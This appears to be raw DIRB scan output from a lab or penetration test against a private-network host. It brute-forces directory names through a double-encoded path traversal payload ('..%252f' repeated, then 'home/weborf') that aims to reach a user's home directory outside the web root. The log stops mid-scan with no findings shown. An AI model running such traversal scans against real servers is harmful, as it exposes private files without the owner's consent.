
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sat Jul  5 01:20:13 2025
URL_BASE: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
*** Generating Wordlist...
                                                                               
GENERATED WORDS: 4612
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shop_content
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopadmin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopper
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopping
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopping_cart
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shoppingcart
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopping-lists
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shops
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shops_buyaction
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopstat
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shopsys
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shoutbox
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/show
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/show_post
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/show_thread
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showallsites
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showcase
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showcat
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showcode
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showenv
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showgroups
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showjobs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showkey
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showlogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showmap
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showmsg
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showpost
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showroom
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shows
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/showthread
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/shtml
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/si
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sid
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sign
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sign_up
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signature
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signaturepics
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signed
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signing
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signoff
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signon
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signout
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/signup
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sign-up
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/simple
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/simplelogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/simpleLogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/single
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/single_pages
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sink
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/site
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/site_map
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/siteadmin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitebuilder
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitecore
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitefiles
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/siteimages
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitemap
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/site-map
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/SiteMap
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitemap.gz
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitemap.xml
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitemaps
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitemgr
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sites
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/Sites
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/SiteScope
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sitesearch
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/SiteServer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sk
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skel
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skin1
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skin1_original
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skins
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/skip
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sl
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slabel
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slashdot
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slide_show
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slides
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slideshow
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/slimstat
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sling
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/small
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smarty
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smb
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smblogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smile
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smiles
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smileys
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smilies
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sms
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/smtp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/snippets
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/snoop
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/snp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/so
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/soap
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/soapdocs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/SOAPMonitor
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/soaprouter
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/social
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/soft
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/software
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/Software
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sohoadmin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/solaris
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sold
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/solution
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/solutions
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/solve
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/solved
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/somebody
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/songs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sony
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/soporte
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sort
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sound
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sounds
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/source
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sources
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/Sources
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sox
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/space
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spacer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spain
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spam
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spamlog.log
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spanish
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spaw
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/speakers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spec
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/special
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/special_offers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/specials
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/specified
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/specs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/speedtest
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spellchecker
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/sphider
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/spider
